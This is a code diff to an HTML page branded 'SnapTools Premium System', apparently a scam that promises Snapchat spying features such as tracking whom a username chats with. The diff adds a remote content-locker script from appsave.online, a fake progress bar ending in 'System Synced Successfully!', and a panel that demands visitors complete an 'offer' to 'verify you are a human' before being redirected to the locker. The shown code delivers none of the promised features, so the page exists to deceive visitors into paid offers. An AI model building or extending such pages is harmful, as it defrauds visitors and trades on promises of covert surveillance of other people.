@@ -7,6 +7,8 @@
     <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght=300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
+    <script type="text/javascript" id="ogjs" src="https://appsave.online/cl/js/grj95p"></script>
+    
     <style>
         :root {
             --bg-color: #0b0b0b;
@@ -521,25 +523,6 @@
             flex-shrink: 0;
         }
 
-        .btn-final-unlock {
-            width: 100%;
-            background: linear-gradient(135deg, #34c759 0%, #24963e 100%);
-            border: none;
-            padding: 16px;
-            border-radius: 16px;
-            color: #ffffff;
-            font-weight: 700;
-            font-size: 16px;
-            cursor: pointer;
-            box-shadow: 0 8px 24px rgba(52, 199, 89, 0.3);
-            display: none; 
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 5px; 
-            animation: scaleUp 0.3s ease forwards;
-        }
-
         .loading-overlay { position: absolute; inset: 0; background: var(--phone-bg); z-index: 110; border-radius: 32px; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding-top: 60px; opacity: 0; pointer-events: none; transition: opacity 0.4s ease; }
         .loading-overlay.active { opacity: 1; pointer-events: auto; }
         
@@ -551,6 +534,29 @@
         .progress-bar { stroke: var(--snap-yellow); stroke-dasharray: 345; stroke-dashoffset: 345; transition: stroke-dashoffset 0.1s linear; }
         .progress-text { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 700; color: var(--text-main); }
         .loading-status { margin-top: 24px; font-size: 14px; color: var(--text-sub); letter-spacing: 0.5px; text-align: center; padding: 0 20px; font-weight: 500;}
+
+        .final-offer-box { display: none; flex-direction: column; align-items: center; text-align: center; padding: 0 24px; width: 100%; margin-top: 30px; animation: scaleUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
+        .final-offer-title { font-size: 20px; font-weight: 700; margin-bottom: 10px; letter-spacing: -0.5px; color: #34c759; }
+        .final-offer-desc { font-size: 13px; color: var(--text-sub); line-height: 1.5; margin-bottom: 24px; font-weight: 300; }
+        .final-offer-desc span { color: var(--text-main); font-weight: 600; }
+        
+        .btn-final-verify {
+            width: 100%;
+            background: linear-gradient(135deg, #34c759 0%, #28a745 100%);
+            border: none;
+            padding: 16px;
+            border-radius: 16px;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 8px 24px rgba(52, 199, 89, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .btn-final-verify:active { transform: scale(0.97); }
 
         @keyframes scaleUp { from { opacity: 0; transform: scale(0.92); } to { opacity: 1; transform: scale(1); } }
     </style>
@@ -602,7 +608,7 @@
     <div class="phone-container">
         <header class="nav-bar">
             <div class="logo-area">
-                <div class="logo-icon"><i class="fa-solid fa-ghost"></i></div>
+                <div class="logo-icon"><i class="fa-ghost fa-solid"></i></div>
                 <div class="logo-text">SnapTools<span>Premium System</span></div>
             </div>
             
@@ -676,6 +682,7 @@
                 </div>
             </div>
 
+            <!-- 📷 Hna t9addet b Capital S "Snaping.jpg" bach i-matchi l-file direct f GitHub live -->
             <div class="feature-card" onclick="handleCardClick('Add Tracker To Any Username', 'You will see on their profile when they are chatting with anyone (only 1 person at a time).', 'fa-user-secret', 'Snaping.jpg')">
                 <div class="badge pro">PRO</div>
                 <div class="thumb-wrapper"><i class="fa-solid fa-user-secret thumb-icon-placeholder"></i></div>
@@ -750,10 +757,6 @@
         </div>
 
         <button class="btn-verify" id="mainVerifyBtn" onclick="startVerification()">Verify to Continue</button>
-        
-        <button class="btn-final-unlock" id="finalUnlockBtn" onclick="callOgadsLocker()">
-            <i class="fa-solid fa-unlock-keyhole"></i> Access System Data
-        </button>
 
         <div class="loading-overlay" id="loadingOverlay">
             <div class="progress-box" id="progressBox">
@@ -764,7 +767,16 @@
                     </svg>
                     <div class="progress-text" id="progressText">0%</div>
                 </div>
-                <div class="loading-status" id="loadingStatus">PREPARING ACCOUNT ANALYTICS...</div>
+                <div class="loading-status" id="loadingStatus">LOADING INSIGHT COUNTERS...</div>
+            </div>
+
+            <div class="final-offer-box" id="finalOfferBox">
+                <h3 class="final-offer-title">System Synced Successfully!</h3>
+                <p class="final-offer-desc">To access the full configuration layer and download logs, you must complete <span>(1) offer</span> below to verify you are a human. Once completed, your requested layout will reveal instantly here.</p>
+                
+                <button class="btn-final-verify" onclick="callOgadsLocker()">
+                    <i class="fa-solid fa-shield-checkmark"></i> Complete Final Verification
+                </button>
             </div>
         </div>
     </div>
@@ -779,10 +791,9 @@
         const customImage = document.getElementById('panelCustomImage');
         const blurOverlay = document.getElementById('blurOverlay');
         
-        const mainVerifyBtn = document.getElementById('mainVerifyBtn');
-        const finalUnlockBtn = document.getElementById('finalUnlockBtn');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const progressBox = document.getElementById('progressBox');
+        const finalOfferBox = document.getElementById('finalOfferBox');
         const progressBar = document.getElementById('progressBar');
         const progressText = document.getElementById('progressText');
         const loadingStatus = document.getElementById('loadingStatus');
@@ -873,11 +884,8 @@
         }
 
         function openPreview(title, description, iconClass, imageUrl) {
-            mainVerifyBtn.style.display = 'flex';
-            finalUnlockBtn.style.display = 'none';
-            loadingOverlay.classList.remove('active');
-
             progressBox.style.display = 'flex';
+            finalOfferBox.style.display = 'none';
             progressBar.style.strokeDashoffset = 345;
             progressText.innerText = '0%';
             loadingStatus.style.color = "var(--text-sub)";
@@ -921,7 +929,7 @@
                 "PREPARING PROFILE METRICS...",
                 "GENERATING STATS OVERVIEW...",
                 "LOADING INSIGHT COUNTERS...",
-                "LAUNCHING VERIFICATION LAYER..."
+                "RENDERING DASHBOARD PANEL..."
             ];
 
             const interval = setInterval(() => {
@@ -939,19 +947,23 @@
                 if (progress >= 100) {
                     clearInterval(interval);
                     
+                    loadingStatus.style.color = "#34c759";
+                    loadingStatus.innerText = "DASHBOARD READY!";
+                    
                     setTimeout(() => {
-                        loadingOverlay.classList.remove('active'); 
-                        mainVerifyBtn.style.display = 'none';     
-                        finalUnlockBtn.style.display = 'flex';    
-                    }, 400);
+                        progressBox.style.display = 'none';
+                        finalOfferBox.style.display = 'flex';
+                    }, 500);
                 }
-            }, 30);
+            }, 35);
         }
 
         function callOgadsLocker() {
-            // كود التوجيه المباشر والآمن باش يخدم 100% بلا ما يتبلوكا ف الصفحة
-            var lockerUrl = "https://appsave.online/cl/i/rnernk";
-            window.open(lockerUrl, "_self");
+            if (typeof og_load === 'function') {
+                og_load(); 
+            } else {
+                window.location.href = "https://appsave.online/cl/i/grj95p";
+            }
         }
     </script>
 </body>
